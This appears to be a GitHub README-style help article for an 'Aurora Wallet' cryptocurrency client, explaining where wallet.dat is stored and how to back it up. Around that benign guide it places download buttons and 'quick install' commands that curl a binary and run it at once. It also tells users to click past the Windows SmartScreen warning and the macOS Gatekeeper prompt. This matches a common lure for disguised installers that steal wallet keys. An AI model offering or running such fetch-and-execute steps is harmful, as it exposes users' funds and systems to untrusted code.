![Aurora Wallet wallet.dat location guide](assets/aurora-wallet-guide-article-banner.png)

# Where the Auroracoin wallet.dat file lives on Windows, macOS and Linux

The three data directories, how to open them and what to copy before you touch anything.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Before you import, back up or move a legacy wallet, you need the folder that holds it, and there are three depending on the system.

The data directory contains the wallet file together with the chain data the wallet downloaded. The wallet file is small and holds the keys, while the chain folders are large and replaceable. Copying the wallet file takes seconds and is the first step of every recovery procedure in this library.

<!-- ARTICLE-BODY-BEGIN -->

## The folder for each system

**Windows:** `%APPDATA%\Auroracoin`. Paste that path into the address bar of File Explorer, or type `%APPDATA%` and open the Auroracoin folder.

**macOS:** `~/Library/Application Support/Auroracoin`. In Finder, choose Go, then Go to Folder, and paste the path; the Library folder is hidden by default.

**Linux:** `~/.auroracoin` by default, or the directory you chose during the first run. A file manager shows hidden folders with Ctrl+H.

A wallet that was pointed at another drive keeps the same structure there, and the location is visible in the settings window of the application.

## Copy before you change anything

1. Close the wallet completely and confirm the process has ended.
2. Open the data directory for your system.
3. Copy the wallet file to an external drive.
4. Label the copy with the date.
5. Only then import, rename or move anything.

Copying rather than moving keeps the original available if an import fails halfway. A backup you have never opened is still a backup; a file you moved is a risk.

## What each item in the folder does

The wallet file holds the keys, the labels and the address book. The `blocks` and `chainstate` folders hold the downloaded chain. `peers.dat` holds the last known peers and is safe to delete when connections misbehave, which is one of the checks in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/12-no-peers-connection.md">restoring a peer connection</a>.

If the folder is large and the disk is small, moving the whole directory to another drive and pointing the wallet at it during the first run avoids a second move later. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/02-first-run-setup.md">First-run setup</a> explains where that choice appears.

The safest way to use the file you just found is described in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat</a>, and the current application that reads it is the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>.

## FAQ

### Is the wallet file encrypted?

Only if you set a password. Without one, anyone who copies the file can open the wallet.

### Can I delete the chain folders to save space?

Yes. The wallet downloads them again on the next start, which takes hours but costs nothing.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
- [First-run setup](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/02-first-run-setup.md)
- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
- [Migrate from Auroracoin Core](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md)
